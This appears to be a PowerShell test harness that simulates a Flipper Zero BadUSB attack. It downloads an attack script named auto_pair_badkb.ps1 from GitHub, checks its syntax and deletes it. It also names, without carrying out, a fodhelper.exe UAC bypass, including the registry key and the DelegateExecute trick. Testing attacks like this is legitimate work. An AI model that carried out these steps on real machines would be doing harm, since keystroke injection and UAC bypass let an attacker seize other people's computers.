# Simulation of BadUSB Payload Execution
# This script simulates the entire payload without actual UAC bypass or system modifications

Write-Host "=== Simulating BadUSB Payload Execution ==="

# Step 1: Simulate opening admin terminal (GUI x, A, ENTER)
Write-Host "Step 1: Simulating opening admin terminal - DELAY 1000, GUI x, DELAY 1000, A, DELAY 500, ENTER, DELAY 2000"

# Step 2: Simulate PowerShell command execution
Write-Host "Step 2: Executing simulated PowerShell command..."

# Create temp directory
Write-Host "  - Creating C:\temp directory..."
New-Item -ItemType Directory -Path C:\temp -Force | Out-Null

# Download script
Write-Host "  - Downloading script from GitHub..."
try {
    Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Marcopit92/Flipper-zero/refs/heads/main/dw_scripts/auto_pair_badkb.ps1' -OutFile 'C:\temp\badkb.ps1'
    Write-Host "  - Download successful. File size: $((Get-Item 'C:\temp\badkb.ps1').Length) bytes"
} catch {
    Write-Host "  - Download failed: $_"
    exit
}

# Simulate registry setup for UAC bypass
Write-Host "  - Simulating registry setup for UAC bypass..."
Write-Host "    (Would create HKCU:\Software\Classes\ms-settings\Shell\Open\command)"
Write-Host "    (Would set DelegateExecute to '' and (default) to PowerShell command)"

# Simulate running fodhelper.exe
Write-Host "  - Simulating running fodhelper.exe to trigger UAC bypass..."
Write-Host "    (Would start C:\Windows\System32\fodhelper.exe)"

# Wait 15 seconds
Write-Host "  - Waiting 15 seconds for execution..."
Start-Sleep -Seconds 15

# Test script syntax (without running UI automation) - BEFORE cleanup
Write-Host "Step 3: Testing downloaded script syntax..."
$scriptContent = Get-Content 'C:\temp\badkb.ps1' -Raw
try {
    $null = [scriptblock]::Create($scriptContent)
    Write-Host "  - Script syntax is valid."
} catch {
    Write-Host "  - Script syntax error: $_"
}

# Simulate cleanup
Write-Host "  - Simulating cleanup..."
Write-Host "    (Would remove registry keys)"
Write-Host "    (Would remove C:\temp\badkb.ps1 and C:\temp)"

# Actually remove files
Remove-Item 'C:\temp\badkb.ps1' -Force
Remove-Item 'C:\temp' -Force
Write-Host "  - Cleanup completed."

Write-Host "=== Simulation Complete ==="
Write-Host "Note: Actual execution would require admin privileges and a Bluetooth device named 'BadKB' for full functionality."
